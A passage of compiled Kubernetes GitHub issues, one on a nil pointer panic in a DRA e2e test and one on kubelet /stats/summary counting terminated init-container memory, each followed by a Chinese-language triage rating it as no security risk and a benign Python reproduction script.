In [It] at: runtime/panic.go:262 @ 02/11/25 03:00:14.898

runtime error: invalid memory address or nil pointer dereference

Full Stack Trace
  k8s.io/kubernetes/test/e2e/dra/test-driver/app.(*ExamplePlugin).UpdateStatus(0x476f900?, {0x7faf200beaa8, 0xc000dc7ce0}, 0xc006d7cd00)
  	k8s.io/kubernetes/test/e2e/dra/test-driver/app/kubeletplugin.go:587 +0x2a
  k8s.io/kubernetes/test/e2e/dra.init.func1.2.11({0x7faf200beaa8, 0xc000dc7ce0})
  	k8s.io/kubernetes/test/e2e/dra/dra.go:450 +0x8a8
```

/sig network
/wg device-management
/cc @LionelJouin @aojea 


#### What did you expect to happen?

No panic.

#### How can we reproduce it (as minimally and precisely as possible)?

Run test repeatedly?

#### Anything else we need to know?

Somehow this does not get picked up by https://storage.googleapis.com/k8s-triage, perhaps because of the empty failure message.


#### Kubernetes version

master

#### Cloud provider

n/a

#### OS version

_No response_

#### Install tools

_No response_

#### Container runtime (CRI) and version (if applicable)




#### Related plugins (CNI, CSI, ...) and versions (if applicable)

_No response_

### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该 issue 描述的是一个 E2E 测试用例中出现的 panic 错误，具体表现为资源声明更新状态时出现了空指针引用（nil pointer dereference）的错误。虽然 panic 会导致测试失败，但问题出现在测试代码及其逻辑中，并非针对生产环境中用户或系统的安全攻击向量，也没有涉及远程执行代码、权限提升、拒绝服务等安全隐患。

**复现过程：**

```python
#!/usr/bin/env python3
"""
本脚本用于复现 issue 中描述的 panic 情形，但由于该问题出现在测试环境中，并非安全问题，
因此此脚本不作实际危险操作，仅模拟内存访问错误场景供本地测试和研究使用。

请注意：该脚本仅为模拟 nil pointer dereference 错误的简单演示，不代表真实环境中的代码行为。
"""

import time
import threading

def simulate_nil_pointer_dereference():
    # 模拟一个空指针引用错误
    try:
        ptr = None
        # 试图访问空对象的属性会导致 AttributeError 异常，模拟 nil pointer dereference
        print(ptr.some_attribute)
    except Exception as e:
        # 捕获异常并打印堆栈信息
        print("模拟 panic: 发生异常 ->", e)

def main():
    # 为了模拟测试中可能遇到的随机失败，
    # 我们设置一个简单的定时任务反复尝试执行该函数
    stop_event = threading.Event()

    def worker():
        while not stop_event.is_set():
            simulate_nil_pointer_dereference()
            time.sleep(2)  # 每2秒尝试一次

    # 启动线程
    t = threading.Thread(target=worker)
    t.start()

    # 设置超时2分钟，之后停止模拟
    stop_event.wait(timeout=120)
    stop_event.set()
    t.join()
    print("测试结束。")

# 直接调用 main 函数执行任务
main()
```


---


## Issue #130073 kubelet /stats/summary includes terminated init container in memory.usageBytes

- Issue 链接：[#130073](https://github.com/kubernetes/kubernetes/issues/130073)

### Issue 内容

#### What happened?

For a pod with an init container that copies some files, the `memory.usageBytes` value reported by `kubelet`'s  `/stats/summary` endpoint includes the memory consumption of the init container forever, even though the init container has terminated already.

The value of `memory.usageBytes` differs significantly from what `kubectl top pod` reports for the same pod.

Here is a screenshot where the kubelet reports around 100 MB while `kubectl top` and `k9s` both report 0 MB. (My assumption is that 0 MB is correct for this container and 100 MB is wrong.)

(For the record, kubelet also reports 0 MB when the same pod definition is used, just with the init container removed.)

![Image](https://github.com/user-attachments/assets/85dbe8a1-bece-4b10-95f1-57821eb0c748)


#### What did you expect to happen?

* I expect `kubelet`'s  `/stats/summary` endpoint (and in particular the `memory.usageBytes` value) to only include non-terminated containers of the pod.
* I expect the pod memory usage from `kubectl top pod` and the value of kubelet's `/stats/summary`, `memory.usageBytes` to be the same, or at least close to each other.

#### How can we reproduce it (as minimally and precisely as possible)?

I created a full **reproducer** with instructions here: https://github.com/dash0hq/kubelet-stats-memory-usage-bytes-init-container-issue

#### Anything else we need to know?

I already did a fair bit of analysis by building Kubernetes locally and adding additional logging to what kubelet is doing.

I am pretty sure the root cause is the heuristic by which kubelet picks through the result of the [`getCadvisorContainerInfo(p.cadvisor)`](https://github.com/kubernetes/kubernetes/blob/69ab91a5c59617872c9f48737c64409a9dec2957/pkg/kubelet/stats/cri_stats_provider.go#L172) call to determine whether a container is terminated. For some reason, this heuristic fails to identify the terminated init-container as terminated, and it includes its memory usage into the pods memory usage. From my understanding this is wrong, because a terminated container should not count towards a pod's memory usage.

Here is what happens in more detail:

* kubelet uses the [cri_stats_provider](https://github.com/kubernetes/kubernetes/blob/69ab91a5c59617872c9f48737c64409a9dec2957/pkg/kubelet/stats/cri_stats_provider.go) to collect the metrics (I see there is also cadvisor_stats_provider, not sure how one or the other is selected, YMMV with another provider)
* [`getCadvisorContainerInfo(p.cadvisor)`](https://github.com/kubernetes/kubernetes/blob/69ab91a5c59617872c9f48737c64409a9dec2957/pkg/kubelet/stats/cri_stats_provider.go#L172) uses cadvisor to get metrics for all containers
* The terminated init container is included in cadvisor's response. (I think this is correct as the container has not yet been deleted, and will not as long as the pod is alive)
* [getCRICadvisorStats(allInfos)](https://github.com/kubernetes/kubernetes/blob/69ab91a5c59617872c9f48737c64409a9dec2957/pkg/kubelet/stats/cri_stats_provider.go#L176C1-L176C52) is supposed to remove terminated containers from the raw cadvisor results. (`filterTerminatedContainerInfoAndAssembleByPodCgroupKey`)
* The init container in question is not detected by the heuristics used in `filterTerminatedContainerInfoAndAssembleByPodCgroupKey` (I have not analyzed this part in detail yet.)
* The resulting cinfosByPodCgroupKey/allInfos map contains two entries for the pod UID/cgroup key in question, one for the the actual live container (with close to zero memory usage) and the terminated init container (with around 100 MB memory usage) 
* In the loop that iterates over all containers (`for _, stats := range resp {`), the value faulty value from the terminated init container from `allInfos` is picked up and thus included in the response to `/stats/summary`)

One more odd thing: This does not reproduce if the init container simply does something like `stress-ng -m 1 --vm-bytes 100M -t 5` to consume memory. I am not exactly sure why that makes a difference.

#### Kubernetes version

I originally reproduced this on Docker Desktop for MacOS with Kubernetes version v1.30.5. 
<details>

```console
$ kubectl version
Client Version: v1.32.1
Kustomize Version: v5.5.0
Server Version: v1.30.5
WARNING: version difference between client (1.32) and server (1.30) exceeds the supported minor version skew of +/-1
```

</details>

But the same behavior can also be reproduced when building Kubernetes locally from the current `master` branch (commit 69ab91a5c59617872c9f48737c64409a9dec2957) .

I did that with `kind`:
 
<details>

```console
$ kubectl version
Client Version: v1.32.1
Kustomize Version: v5.5.0
Server Version: v1.33.0-alpha.1.85+69ab91a5c59617-dirty
```

</details>

#### Cloud provider

N. A.

#### OS version

<details>

I reproduced this is on MacOS with Docker Desktop (version: 4.37.2 (179585)) as well as `kind`. I'll leave the OS details of the kind container here (after `docker exec -it kind-control-plane /bin/bash`):
```console
# On Linux:
$ cat /etc/os-release
PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"
NAME="Debian GNU/Linux"
VERSION_ID="12"
VERSION="12 (bookworm)"
VERSION_CODENAME=bookworm
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
$ uname -a
Linux kind-control-plane 6.10.14-linuxkit #1 SMP Fri Nov 29 17:22:03 UTC 2024 aarch64 GNU/Linux
```

</details>


#### Install tools

<details>
N.A.
</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该 issue 描述了 kubelet 在统计 pod 内存使用量时，将已终止的 init 容器的内存使用量错误地计入了 pod 的总体内存中，导致与 “kubectl top pod” 以及其他工具（如 k9s）显示的数据不符。从问题描述来看，该问题属于指标计算的 bug，而并非由恶意攻击触发或利用的安全漏洞（例如代码执行、拒绝服务、提权或容器逃逸等）。因此，其本身并不构成安全风险，也不会使攻击者获得额外权限或影响集群的安全性。

**复现过程：**

```python
#!/usr/bin/env python3
"""
复现POC说明：
1. 该脚本使用 python 的 kubernetes 库在集群中创建一个包含 init 容器和主容器的 pod。
2. init 容器用于执行简单拷贝操作，主容器简单睡眠以便保持 pod 运行状态。
3. 脚本会等待 pod 进入 Running 状态后，通过 metrics.k8s.io API （类似 kubectl top）获取各容器的内存使用情况。
4. 用户可以观察到，通过官方 metrics API（通常不统计已终止 init 容器的内存）与 kubelet /stats/summary（bug 状态下错误计入内存）报告的数据存在差异。
5. 最后，脚本会清理所创建的 pod。
注意：该脚本仅用于复现问题环境（指标差异），并无安全风险，且仅供本地测试使用。
"""

import time
import sys
import threading
from kubernetes import client, config
from kubernetes.client.rest import ApiException

# 设置总的执行超时（单位秒），确保脚本在2分钟内退出
EXECUTION_TIMEOUT = 120

def create_pod(api_instance, namespace, pod_name):
    pod_manifest = {
        "apiVersion": "v1",
        "kind": "Pod",
        "metadata": {"name": pod_name},
        "spec": {
            # 定义 init 容器：用于拷贝文件，执行完毕后即退出
            "initContainers": [{
                "name": "init-copy",
                "image": "busybox",
                "command": ["/bin/sh", "-c", "cp /etc/hosts /tmp/hosts-copy"],
            }],
            # 主容器，简单 sleep 保持 pod 处于 Running 状态
            "containers": [{
                "name": "main",
                "image": "busybox",
                "command": ["/bin/sh", "-c", "sleep 3600"],
            }],
            "restartPolicy": "Never"
        }
    }
    try:
        api_response = api_instance.create_namespaced_pod(namespace=namespace, body=pod_manifest)
        print("Pod 已创建:", api_response.metadata.name)
    except ApiException as e:
        print("创建 Pod 时发生异常: %s\n" % e)
        sys.exit(1)

def delete_pod(api_instance, namespace, pod_name):
    try:
        api_instance.delete_namespaced_pod(name=pod_name, namespace=namespace)
        print("Pod 已删除:", pod_name)
    except ApiException as e:
        print("删除 Pod 时发生异常: %s\n" % e)

def wait_for_pod_ready(api_instance, namespace, pod_name, timeout=60):
    start_time = time.time()
    while time.time() - start_time < timeout:
        try:
            pod = api_instance.read_namespaced_pod(name=pod_name, namespace=namespace)
        except ApiException:
            time.sleep(2)
            continue
        # 判断 pod 是否处于 Running 状态且 init 容器结束
        if pod.status.phase == "Running":
            # 如果 init 容器已结束，其状态不会出现在 pod.status.initContainerStatuses 中
            init_statuses = pod.status.init_container_statuses
            # 若 init_container_statuses 存在，则检测是否均已退出（state.terminated 状态）
            if init_statuses:
                terminated = all([status.state.terminated is not None for status in init_statuses])
                if terminated:
                    print("Pod {} 已就绪".format(pod_name))
                    return True
            else:
                # 如果没有 init 容器状态信息，也视为就绪
                print("Pod {} 无 init 容器状态信息，视为就绪".format(pod_name))
                return True
        time.sleep(2)
    print("等待 pod {} 就绪超时".format(pod_name))
    return False

def get_pod_metrics(custom_api, namespace, pod_name):
    try:
        metrics = custom_api.get_namespaced_custom_object(
            group="metrics.k8s.io",
            version="v1beta1",
            namespace=namespace,
            plural="pods",
            name=pod_name
        )
        return metrics
    except ApiException as e:
        print("获取 pod metrics 时发生异常: %s\n" % e)
        return None

def main():
    # 注册一个定时器，确保总执行时间不超过 EXECUTION_TIMEOUT 秒
    timer = threading.Timer(EXECUTION_TIMEOUT, lambda: sys.exit("执行超时，脚本退出"))
    timer.start()
    
    # 加载 Kubernetes 配置（默认从 ~/.kube/config 加载）
    try:
        config.load_kube_config()
    except Exception as e:
        print("加载 kubeconfig 失败: %s" % e)
        sys.exit(1)
    
    core_v1 = client.CoreV1Api()
    custom_api = client.CustomObjectsApi()
    
    namespace = "default"
    pod_name = "init-container-test"
    
    # 创建 pod
    create_pod(core_v1, namespace, pod_name)
    
    # 等待 pod 就绪
    if not wait_for_pod_ready(core_v1, namespace, pod_name, timeout=60):
        delete_pod(core_v1, namespace, pod_name)
        sys.exit(1)
    
    # 尝试获取 pod metrics，该 metrics 通常来自 metrics server（如 kubectl top 显示数据）
    metrics = get_pod_metrics(custom_api, namespace, pod_name)
    if metrics:
        print("从 metrics.k8s.io 获取到 pod 资源使用情况：")
        for container in metrics.get("containers", []):
            name = container.get("name")
            usage = container.get("usage", {})
            memory = usage.get("memory")
            cpu = usage.get("cpu")
            print("  容器名：{}，CPU：{}，内存：{}".format(name, cpu, memory))
    else:
        print("未能获取到 pod 的 metrics。")
    
    # 提示：该复现主要用于创建带有 init 容器的 pod，并观察不同工具（如 metrics API 与 kubelet /stats/summary）对内存统计的差异。
    print("\n注意：kubelet /stats/summary 端点的内存统计问题需要通过节点直接访问该 HTTP 接口来验证，此脚本仅复现了 pod 部署和 metrics 数据获取。")
    
    # 清理创建的 pod
    delete_pod(core_v1, namespace, pod_name)
    
    timer.cancel()
    print("脚本执行完毕。")

# 直接调用 main 函数
main()
```


---


